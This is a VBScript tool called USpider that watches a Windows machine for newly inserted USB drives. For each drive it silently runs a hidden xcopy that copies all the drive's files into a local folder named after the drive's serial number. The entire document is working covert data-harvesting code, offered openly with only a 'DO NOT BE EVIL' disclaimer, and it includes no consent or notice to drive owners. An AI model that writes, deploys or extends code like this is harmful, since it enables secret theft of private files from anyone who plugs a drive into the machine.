' Uspider v1.1 by jimmy19990
' =========================
' With great might comes great responsibility. DO NOT BE EVIL.
'
' URL: https://github.com/jimmy19990/USpider.vbs

' Configuration
destFolder = "D:\USpider"
xcopyParameters = "/e /r /y"
 
' Main Script
strComputer = "." 
Set objFileSystem = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set objWScriptShell = CreateObject("WScript.Shell")
Set colEvents = objWMIService.ExecNotificationQuery _
    ("Select * From __InstanceOperationEvent Within 10 Where " _
        & "TargetInstance isa 'Win32_LogicalDisk'")

' Record availability to prevent repeat copy.
Dim isAvailable(26)
For i = 0 to 25
    isAvailable(i) = true
Next

' Initialize Destination Folder.
If objFileSystem.folderExists(destFolder) = false Then
    objFileSystem.CreateFolder destFolder
End If

Do While True
    Set objEvent = colEvents.NextEvent
    If objEvent.TargetInstance.DriveType = 2 Then
        Select Case objEvent.Path_.Class
            Case "__InstanceCreationEvent"
                ' Ensure only copy once.
                If isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = true Then
                    ' Get Device Serial Number.
                    Set colItems = objWMIService.ExecQuery("Select * from Win32_Volume where Name = '" & objEvent.TargetInstance.DeviceId & "\\'")
                    For Each objItem In colItems
                        diskSN = objItem.SerialNumber
                        Exit For
                    Next
                    
                    ' Verify Device Serial Number.
                    ' Coming Soon...
                    
                    ' Initialize Work Folder.
                    workFolder = destFolder + "\" + CStr(diskSN)
                    If objFileSystem.folderExists(workFolder) = false Then
                        objFileSystem.CreateFolder workFolder
                    End If
                    
                    ' Copy All Files.
                    c = "cmd.exe /c xcopy " + objEvent.TargetInstance.DeviceId + "\* " + workFolder + " " + xcopyParameters
                    objWScriptShell.Run(c), 0
                    
                    ' Update availability.
                    isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = false
                End If
            Case "__InstanceDeletionEvent"
                ' Update availability.
                isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = true
        End Select
    End If
Loop
